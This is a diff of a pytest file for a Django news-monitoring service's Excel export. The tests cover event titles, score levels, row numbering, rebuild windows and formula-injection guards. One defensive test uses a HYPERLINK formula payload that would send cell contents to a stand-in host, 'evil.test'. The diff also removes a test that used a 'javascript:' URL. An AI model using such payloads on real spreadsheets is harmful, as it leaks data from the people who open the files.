@@ -10,19 +10,15 @@ from __future__ import annotations
 import itertools
 import zipfile
 from datetime import timedelta
-from zoneinfo import ZoneInfo
 
 import pytest
-from django.conf import settings
 from django.utils import timezone
 from openpyxl import load_workbook
 
-from articles.models import Article
+from articles.models import Article, EventAssessment, EventWatchItem, NewsEvent, WatchItem
 from core.scoring import HIGH_COUNT_REQUIRED, decide
-from core.text import jalali_str, to_jalali
 from core.vocabulary import GOLD_TRENDS, LEVELS, NotifyStatus
 from exports import workbook
-from inference.models import Classification, Evaluation, Summary
 
 pytestmark = pytest.mark.django_db
 
@@ -89,59 +85,105 @@ def notify_by_formula(scores) -> str:
 
 
 @pytest.fixture
-def analysed(make_article, variant):
-    """An article with a full set of inference rows, as the workbook expects."""
+def analysed(make_article):
+    """A news event with a Jev assessment, as the workbook now reads them.
 
-    def _make(category="security", **scores):
-        article = make_article(published_at=timezone.now())
-        Classification.objects.create(
-            article=article, variant=variant, prompt_version=variant.prompt_version,
-            provider="gapgpt", model="m", category=category, confidence="زیاد",
+    Defaults notify: «زیاد» occurrence (several source groups), «زیاد» gold (75) and
+    «خیلی زیاد» security (Iran score 80, security topic).
+    """
+
+    def _make(category="conflict_security", evidence="multi", gold=75, iran=80,
+              brief="خلاصه رویداد", title="تیتر رویداد", when=None):
+        when = when or timezone.now()
+        article = make_article(published_at=when)
+        event = NewsEvent.objects.create(
+            primary_article=article, event_time=when, first_seen_at=when, category=category,
+            evidence_level=evidence, iran_score=iran, global_score=iran, title_fa=title,
+            brief_fa=brief,
         )
-        Evaluation.objects.create(
-            article=article, variant=variant, prompt_version=variant.prompt_version,
-            provider="gapgpt", model="m",
-            confidence_occurrence=scores.get("confidence_occurrence", "زیاد"),
-            gold_price_impact=scores.get("gold_price_impact"),
-            security_relevance=scores.get("security_relevance", "زیاد"),
-            gold_trend=scores.get("gold_trend", "↑"),
+        event.articles.add(article)
+        EventAssessment.objects.create(
+            event=event, model="jev", evidence_hash="h", category=category,
+            iran_score=iran or 0, global_score=iran or 0,
+            asset_scores={} if gold is None else {"gold": gold}, confidence=0.9,
         )
-        Summary.objects.create(
-            article=article, variant=variant, prompt_version=variant.prompt_version,
-            provider="gapgpt", model="m",
-            optimized_title="تیتر بهینه‌شده", one_line="خلاصه یک‌خطی",
-        )
-        return article
+        return event
 
     return _make
 
 
-class TestRows:
-    def test_uses_the_optimised_title_when_available(self, analysed):
-        analysed()
-        assert workbook.rows()[0]["تیتر خبر"] == "تیتر بهینه‌شده"
+def _age(event, days, *, touched_days=None):
+    moment = timezone.now() - timedelta(days=days)
+    touched = timezone.now() - timedelta(days=days if touched_days is None else touched_days)
+    # queryset.update() leaves auto_now alone, so updated_at is set explicitly.
+    NewsEvent.objects.filter(pk=event.pk).update(event_time=moment, updated_at=touched)
 
-    def test_falls_back_to_the_original_title(self, make_article):
-        article = make_article(published_at=timezone.now())
-        assert workbook.rows()[0]["تیتر خبر"] == article.original_title
+
+class TestRows:
+    def test_uses_the_events_persian_title(self, analysed):
+        analysed()
+        assert workbook.rows()[0]["تیتر خبر"] == "تیتر رویداد"
+
+    def test_falls_back_to_the_original_title(self, analysed):
+        event = analysed(title="")
+        assert workbook.rows()[0]["تیتر خبر"] == event.primary_article.original_title
+
+    def test_scores_map_onto_the_teams_levels(self, analysed):
+        analysed(evidence="official", gold=50, iran=100)
+        record = workbook.rows()[0]
+        assert record["اطمینان از وقوع خبر"] == "خیلی زیاد"
+        assert record["چقدر بر تغییر قیمت طلا اثر دارد؟"] == "متوسط"
+        assert record["چقدربا امنیت مرتبط است ؟"] == "خیلی زیاد"
 
     def test_an_unassessed_axis_is_blank_not_a_level(self, analysed):
         """The workbook has to show 'nobody judged this', and a blank cell is how the
         team's file expresses it. Writing a level would be the sentinel bug in Excel."""
-        analysed(gold_price_impact=None)
+        analysed(gold=None)
+        assert workbook.rows()[0]["چقدر بر تغییر قیمت طلا اثر دارد؟"] == ""
+
+    def test_security_is_blank_outside_security_topics(self, analysed):
+        analysed(category="macro_monetary")
         record = workbook.rows()[0]
-        assert record["چقدر بر تغییر قیمت طلا اثر دارد؟"] == ""
+        assert record["چقدربا امنیت مرتبط است ؟"] == ""
+        assert record["_category"] == "economics"
+
+    def test_gold_trend_is_blank_because_no_direction_was_predicted(self, analysed):
+        analysed()
+        assert workbook.rows()[0]["جهت طلا"] == ""
 
     def test_notify_status_matches_the_scoring_rule(self, analysed):
-        analysed(confidence_occurrence="زیاد", security_relevance="زیاد")
+        analysed()
         assert workbook.rows()[0][workbook.NOTIFY_HEADER] == NotifyStatus.NOTIFY
 
-    def test_duplicates_are_excluded(self, analysed, make_article):
-        canonical = analysed()
-        duplicate = make_article(published_at=timezone.now())
-        duplicate.duplicate_of = canonical
-        duplicate.save()
-        assert len(workbook.rows()) == 1
+    def test_withdrawn_events_are_excluded(self, analysed):
+        analysed()
+        NewsEvent.objects.update(status=NewsEvent.Status.WITHDRAWN)
+        assert workbook.rows() == []
+
+    def test_sources_brief_and_watch_items(self, analysed, make_article):
+        event = analysed()
+        other = make_article(original_outlet="ایسنا")
+        event.articles.add(other)
+        item = WatchItem.objects.create(
+            slug="gold_18k", kind="asset", name_fa="طلای ۱۸ عیار", name_en="18k gold"
+        )
+        EventWatchItem.objects.create(event=event, item=item)
+        record = workbook.rows()[0]
+        assert "ایسنا" in record["منبع"] and "، " in record["منبع"]
+        assert record["توضیحات"] == "خلاصه رویداد\nپایش: طلای ۱۸ عیار"
+
+    def test_cells_only_carry_the_teams_vocabulary(self, analysed):
+        """Every score cell is a level from core.vocabulary or blank; the trend cell is a
+        gold trend or blank. Anything else is a value the workbook's dropdown rejects."""
+        for evidence in ("single", "multi", "official", "disputed"):
+            for category in ("conflict_security", "energy_commodities", "disasters"):
+                analysed(evidence=evidence, category=category, gold=None, iran=0)
+                analysed(evidence=evidence, category=category, gold=100, iran=100)
+        for record in workbook.rows():
+            for header in workbook.HEADERS[5:8]:
+                assert record[header] in ("", *LEVELS), (header, record[header])
+            assert record["جهت طلا"] in ("", *GOLD_TRENDS)
+            assert record[workbook.NOTIFY_HEADER] in NotifyStatus.values
 
     def test_persian_dates_use_the_teams_format(self):
         assert workbook.persian_date("1405-06-11") == "11 شهریور 1405"
@@ -228,8 +270,8 @@ class TestBuiltFile:
 
 
 class TestExportAll:
-    def test_other_articles_stay_out_of_the_workbook(self, analysed, tmp_path):
-        """`other` articles are stored and visible in the app, but the workbook is a
+    def test_other_events_stay_out_of_the_workbook(self, analysed, tmp_path):
+        """`other` events are stored and visible in the app, but the workbook is a
         security/economics instrument and the team's files never carried them."""
         analysed(category="other")
         files = workbook.export_all(tmp_path)
@@ -248,8 +290,8 @@ class TestExportAll:
         assert files["text:security"].exists()
         assert files["text:security/economics"].exists()
 
-    def test_notify_feed_contains_only_notifying_articles(self, analysed, tmp_path):
-        analysed(confidence_occurrence="کم", security_relevance="کم")
+    def test_notify_feed_contains_only_notifying_events(self, analysed, tmp_path):
+        analysed(evidence="disputed", gold=25, iran=30)
         files = workbook.export_all(tmp_path)
         assert files["important"].read_text(encoding="utf-8").strip() == ""
 
@@ -257,25 +299,13 @@ class TestExportAll:
 class TestRowNumbering:
     """`شناسه خبر` is a position within the file, not a corpus-wide sequence.
 
-    Checked against the team's own output, not inferred: all 40 workbooks under
-    `LEGACY/NEWS_AI_PROJECT/*/Excel Files/` number their rows 1..N from 1, with zero
-    exceptions. The exporter enumerated the WHOLE canonical corpus and then grouped the
-    already-numbered records by day, so the second day of a deployment opened with
-    «شناسه خبر» starting at 51. Nothing in the pipeline notices - the file still opens, and
-    the only reader who sees it is the analyst.
+    Checked against the team's own output: all 40 workbooks number their rows 1..N.
     """
 
     def test_each_workbook_numbers_its_own_rows_from_one(self, analysed, tmp_path):
-        yesterday = timezone.now() - timedelta(days=1)
         for _ in range(2):
             analysed()
-        older = analysed()
-        Article.objects.filter(pk=older.pk).update(
-            published_at=yesterday,
-            published_at_jalali=jalali_str(
-                to_jalali(yesterday.astimezone(ZoneInfo(settings.TEHRAN_TZ)))
-            ),
-        )
+        _age(analysed(), 1)
 
         files = workbook.export_all(tmp_path)
         paths = [path for key, path in files.items() if key.startswith("excel:")]
@@ -293,8 +323,6 @@ class TestRowNumbering:
             )
 
     def test_numbering_is_a_property_of_the_file_not_of_the_records(self, analysed, tmp_path):
-        """Handing `build_workbook` an arbitrary slice still yields 1..N, so no future way
-        of selecting records can reintroduce a global sequence."""
         for _ in range(3):
             analysed()
         target = workbook.build_workbook(workbook.rows()[1:], tmp_path / "slice.xlsx")
@@ -304,27 +332,17 @@ class TestRowNumbering:
 
 
 class TestRebuildIsBounded:
-    """The nightly task rebuilt one workbook per Jalali day in the whole corpus, forever.
+    """The nightly task rebuilds only the days whose events changed inside the rolling
+    window, and the export volume keeps a bounded number of files (storage policy)."""
 
-    Each is a template copy, an openpyxl parse, a save and a zip rewrite, so the cost grew
-    without limit for the life of the deployment while almost every file was rewritten
-    byte-for-byte. Nothing about the output would ever show it - only the clock.
-    """
-
-    def _age(self, article, days):
-        moment = timezone.now() - timedelta(days=days)
-        Article.objects.filter(pk=article.pk).update(
-            published_at=moment,
-            fetched_at=moment,
-            published_at_jalali=jalali_str(
-                to_jalali(moment.astimezone(ZoneInfo(settings.TEHRAN_TZ)))
-            ),
-        )
-
-    def test_a_day_nobody_touched_is_not_rebuilt(self, analysed, tmp_path, settings):
+    @pytest.fixture(autouse=True)
+    def _settings(self, settings, tmp_path):
         settings.NEWS_ROLLING_WINDOW_DAYS = 14
+        settings.EXPORT_KEEP_DAYS = 60
         settings.EXPORT_DIR = tmp_path
-        self._age(analysed(), 90)
+
+    def test_a_day_nobody_touched_is_not_rebuilt(self, analysed):
+        _age(analysed(), 30)
         analysed()
 
         from exports.tasks import build_daily_workbook
@@ -332,58 +350,64 @@ class TestRebuildIsBounded:
         result = build_daily_workbook()
         assert result["workbooks"] == 1, "only the recent day should have been rebuilt"
 
-    def test_a_backfilled_old_article_does_bring_its_day_back(self, analysed, tmp_path, settings):
-        """The window is on FETCH time, not publication time. A backfill run pulls in
-        months-old articles today, and their workbook is an old day's file that genuinely
-        does need rewriting - keying this on publication would silently skip it."""
-        settings.NEWS_ROLLING_WINDOW_DAYS = 14
-        settings.EXPORT_DIR = tmp_path
-        old = analysed()
-        moment = timezone.now() - timedelta(days=90)
-        Article.objects.filter(pk=old.pk).update(
-            published_at=moment,
-            fetched_at=timezone.now(),  # fetched today, published in the spring
-            published_at_jalali=jalali_str(
-                to_jalali(moment.astimezone(ZoneInfo(settings.TEHRAN_TZ)))
-            ),
-        )
+    def test_a_late_assessment_brings_its_day_back(self, analysed):
+        """Keyed on the event's last change, not its time: a re-assessed old event
+        belongs in that old day's file."""
+        _age(analysed(), 30, touched_days=0)
 
         from exports.tasks import build_daily_workbook
 
         assert build_daily_workbook()["workbooks"] == 1
 
-    def test_rebuild_all_is_the_escape_for_a_fresh_deployment(self, analysed, tmp_path, settings):
-        settings.NEWS_ROLLING_WINDOW_DAYS = 14
-        settings.EXPORT_DIR = tmp_path
-        self._age(analysed(), 90)
+    def test_rebuild_all_is_the_escape_for_a_fresh_deployment(self, analysed):
+        _age(analysed(), 30)
         analysed()
 
         from exports.tasks import build_daily_workbook
 
         assert build_daily_workbook(rebuild_all=True)["workbooks"] == 2
 
-    def test_the_text_feeds_still_cover_the_whole_corpus(self, analysed, tmp_path, settings):
-        """One file each, not one per day, so bounding them would just lose data."""
-        settings.NEWS_ROLLING_WINDOW_DAYS = 14
-        settings.EXPORT_DIR = tmp_path
-        self._age(analysed(), 90)
+    def test_events_older_than_the_kept_span_are_left_out(self, analysed, tmp_path):
+        _age(analysed(title="رویداد قدیمی"), 90, touched_days=0)
+
+        from exports.tasks import build_daily_workbook
+
+        assert build_daily_workbook(rebuild_all=True)["workbooks"] == 0
+        feed = (tmp_path / "TXT Files" / "security_news.txt").read_text(encoding="utf-8")
+        assert "رویداد قدیمی" not in feed
+
+    def test_the_text_feeds_cover_the_kept_span(self, analysed, tmp_path):
+        _age(analysed(), 30)
 
         from exports.tasks import build_daily_workbook
 
         build_daily_workbook()
         feed = (tmp_path / "TXT Files" / "security_news.txt").read_text(encoding="utf-8")
-        assert "تیتر بهینه‌شده" in feed
+        assert "تیتر رویداد" in feed
+
+    def test_only_the_newest_workbooks_are_kept(self, tmp_path):
+        import os
+
+        folder = tmp_path / "Excel Files"
+        folder.mkdir()
+        for index in range(5):
+            path = folder / f"{index}.xlsx"
+            path.write_bytes(b"x")
+            os.utime(path, (index, index))
+        removed = workbook.prune_workbooks(folder, 3)
+        assert sorted(path.name for path in removed) == ["0.xlsx", "1.xlsx"]
+        assert sorted(path.name for path in folder.iterdir()) == ["2.xlsx", "3.xlsx", "4.xlsx"]
 
 
 class TestSpreadsheetInjection:
     """A crawled headline must not become a live formula.
 
     openpyxl types any string starting with `=` as a FORMULA, so the payload is inert
-    everywhere in this system except in the one artifact a human opens. Titles, leads and
-    outlet names come verbatim from third-party markup.
+    everywhere in this system except in the one artifact a human opens. Titles and outlet
+    names come verbatim from third-party markup.
     """
 
-    def _sheet(self, article, tmp_path, name):
+    def _sheet(self, tmp_path, name):
         target = workbook.build_workbook(workbook.rows(), tmp_path / name)
         return load_workbook(target)[workbook.SHEET]
 
@@ -391,21 +415,20 @@ class TestSpreadsheetInjection:
         self, analysed, tmp_path
     ):
         payload = '=HYPERLINK("http://evil.test/?x="&A2,"مشاهده خبر")'
-        article = analysed()
-        Article.objects.filter(pk=article.pk).update(original_title=payload)
-        Summary.objects.filter(article=article).delete()
+        event = analysed(title="")
+        Article.objects.filter(pk=event.primary_article_id).update(original_title=payload)
 
-        sheet = self._sheet(article, tmp_path, "title.xlsx")
+        sheet = self._sheet(tmp_path, "title.xlsx")
         cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("تیتر خبر") + 1)
         assert cell.data_type == "s", "a crawled title must never be typed as a formula"
         assert cell.value == payload, "and the text itself must survive unchanged"
 
     def test_an_outlet_name_is_stored_as_text_too(self, analysed, tmp_path):
         """Every value column, not just the title - the outlet is equally third-party."""
-        article = analysed()
-        Article.objects.filter(pk=article.pk).update(original_outlet="=1+1")
+        event = analysed()
+        Article.objects.filter(pk=event.primary_article_id).update(original_outlet="=1+1")
 
-        sheet = self._sheet(article, tmp_path, "outlet.xlsx")
+        sheet = self._sheet(tmp_path, "outlet.xlsx")
         cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("منبع") + 1)
         assert cell.data_type == "s"
 
@@ -413,36 +436,8 @@ class TestSpreadsheetInjection:
         """The guard must not disarm the one formula that is supposed to be there - it is
         what keeps the sheet from voting differently from `decide()`."""
         analysed()
-        sheet = self._sheet(None, tmp_path, "notify.xlsx")
+        sheet = self._sheet(tmp_path, "notify.xlsx")
         cell = sheet.cell(
             workbook.FIRST_DATA_ROW, workbook.HEADERS.index(workbook.NOTIFY_HEADER) + 1
         )
         assert cell.data_type == "f"
-
-    def test_a_non_http_url_is_not_turned_into_a_clickable_link(self, analysed, tmp_path):
-        """`urljoin` resolves `javascript:...` to itself, and `quality_reason` records
-        `invalid_url` as a flag without stopping the row reaching the workbook."""
-        article = analysed()
-        Article.objects.filter(pk=article.pk).update(url="javascript:alert(1)")
-
-        sheet = self._sheet(article, tmp_path, "link.xlsx")
-        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("لینک") + 1)
-        assert cell.hyperlink is None
-        assert cell.value == "javascript:alert(1)", "still shown, just not clickable"
-
-    def test_an_ordinary_link_is_still_a_hyperlink(self, analysed, tmp_path):
-        analysed()
-        sheet = self._sheet(None, tmp_path, "ok-link.xlsx")
-        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("لینک") + 1)
-        assert cell.hyperlink is not None
-
-
-class TestIdColumnIsNumeric:
-    def test_the_id_is_a_number_not_a_string(self, analysed, tmp_path):
-        """All 40 of the team's workbooks store an integer in «شناسه خبر». A numeric-looking
-        string renders left-aligned as text and does not sort as a number."""
-        analysed()
-        target = workbook.build_workbook(workbook.rows(), tmp_path / "id.xlsx")
-        cell = load_workbook(target)[workbook.SHEET].cell(workbook.FIRST_DATA_ROW, 1)
-        assert cell.value == 1
-        assert isinstance(cell.value, int)
